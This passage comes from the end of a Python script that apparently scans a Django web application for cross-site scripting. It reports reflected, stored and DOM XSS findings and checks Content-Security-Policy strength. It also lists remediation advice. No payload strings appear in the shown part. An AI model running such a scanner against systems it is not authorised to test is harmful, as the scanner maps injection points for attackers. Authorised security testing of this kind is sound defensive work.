                                'options': options
                            }
                            fields.append(field)
                        
                        # Filter out fields without names
                        fields = [f for f in fields if f.get('name')]
                        
                        if fields:
                            storage_forms.append((form_url, method, fields))
                
                except Exception as e:
                    logger.error(f"Error processing page {url}: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"Error finding storage forms: {e}")
        
        return storage_forms

    def analyze_results(self):
        """Analyze the test results and generate report"""
        logger.info("\n[ANALYSIS]")
        
        vulnerable_count = 0
        
        # Check reflected XSS results
        reflected_vulnerable = len([r for r in self.results['reflected'] if r['vulnerable']])
        if reflected_vulnerable > 0:
            vulnerable_count += 1
            logger.warning(f"\n[REFLECTED XSS] Found {reflected_vulnerable} vulnerabilities")
            
            # Show vulnerable entry points
            table_data = []
            for result in self.results['reflected']:
                if result['vulnerable']:
                    table_data.append([
                        result['url'],
                        result['method'],
                        result['parameter'],
                        result['payload'],
                        "Yes" if result['has_script_execution'] else "Unknown"
                    ])
            
            if table_data:
                headers = ["URL", "Method", "Parameter", "Payload", "Executed"]
                logger.warning(tabulate(table_data, headers=headers, tablefmt="grid"))
        else:
            logger.info("\n[REFLECTED XSS] No vulnerabilities found")
        
        # Check stored XSS results
        stored_vulnerable = len(self.results['stored'])
        if stored_vulnerable > 0:
            vulnerable_count += 1
            logger.warning(f"\n[STORED XSS] Found {stored_vulnerable} vulnerabilities")
            
            # Show vulnerable forms
            table_data = []
            for result in self.results['stored']:
                table_data.append([
                    result['url'],
                    result['method'],
                    result['field'],
                    result['payload'],
                    result['stored_url']
                ])
            
            if table_data:
                headers = ["Form URL", "Method", "Field", "Payload", "Displayed At"]
                logger.warning(tabulate(table_data, headers=headers, tablefmt="grid"))
        else:
            logger.info("\n[STORED XSS] No vulnerabilities found")
        
        # Check DOM XSS results
        dom_vulnerable = len(self.results['dom'])
        if dom_vulnerable > 0:
            vulnerable_count += 1
            logger.warning(f"\n[DOM XSS] Found {dom_vulnerable} vulnerabilities")
            
            # Show vulnerable pages
            table_data = []
            for result in self.results['dom']:
                table_data.append([
                    result['url'],
                    result['payload'],
                    result.get('notes', '')
                ])
            
            if table_data:
                headers = ["URL", "Payload", "Notes"]
                logger.warning(tabulate(table_data, headers=headers, tablefmt="grid"))
        else:
            logger.info("\n[DOM XSS] No vulnerabilities found")
        
        # Check CSP effectiveness
        csp_effective = all(data.get('effective', False) for data in self.results['csp'].values())
        csp_present = any(data.get('has_csp', False) for data in self.results['csp'].values())
        
        logger.info("\n[CONTENT SECURITY POLICY]")
        if not csp_present:
            logger.warning("No Content-Security-Policy header found")
            vulnerable_count += 1
        elif not csp_effective:
            logger.warning("Content-Security-Policy is present but potentially ineffective")
            vulnerable_count += 1
        else:
            logger.info("Content-Security-Policy is present and appears effective")
        
        # Overall summary
        logger.info("\n[SUMMARY]")
        if vulnerable_count > 0:
            logger.warning(f"The application appears to be vulnerable to XSS attacks in {vulnerable_count} area(s)")
            logger.warning("Recommendations:")
            logger.warning("1. Implement proper input validation and sanitization (use Django's bleach library)")
            logger.warning("2. Implement a strong Content-Security-Policy")
            logger.warning("3. Use Django's template system's auto-escaping")
            logger.warning("4. Encode user input before displaying it (HTML entities)")
            logger.warning("5. Use HttpOnly and Secure flags for cookies")
            logger.warning("6. Consider using a Web Application Firewall (WAF)")
        else:
            logger.info("The application appears to be resistant to XSS attacks")
            logger.info("Good security practices to maintain:")
            logger.info("1. Continue using Django's auto-escaping template system")
            logger.info("2. Continue sanitizing user input with bleach")
            logger.info("3. Strengthen Content-Security-Policy header")
            logger.info("4. Regularly update all dependencies")
            logger.info("5. Perform regular security audits")

    def run_test(self):
        """Run the full XSS test suite"""
        logger.info(f"[*] Starting XSS test on {self.target_url}")
        logger.info(f"[*] Test ID: {self.test_id}")
        
        # Test for reflected XSS
        self.test_reflected_xss()
        
        # Test for stored XSS
        self.test_stored_xss()
        
        # Test for DOM XSS
        self.test_dom_xss()
        
        # Test CSP effectiveness
        self.test_csp_effectiveness()
        
        # Analyze results
        self.analyze_results()
        
        # Clean up WebDriver
        if self.driver:
            self.driver.quit()
            self.driver = None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} [target_url] [username] [password]")
        print(f"Example: {sys.argv[0]} https://localhost:8000/ admin password123")
        sys.exit(1)
    
    target_url = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else None
    password = sys.argv[3] if len(sys.argv) > 3 else None
    
    try:
        # Verify that required packages are installed
        import bs4
        import tabulate
    except ImportError as e:
        missing_package = str(e).split("'")[1]
        print(f"[!] Required package '{missing_package}' is missing. Please install it with:")
        print(f"    pip install {missing_package}")
        print("[!] You may also need to install: beautifulsoup4, tabulate, selenium")
        sys.exit(1)
    
    try:
        # Check for Selenium
        import selenium
    except ImportError:
        print("[!] Selenium is not installed. Some tests will be skipped.")
        print("    Install with: pip install selenium")
    
    tester = XSSTest(target_url, username, password)
    tester.run_test()

if __name__ == "__main__":
    main()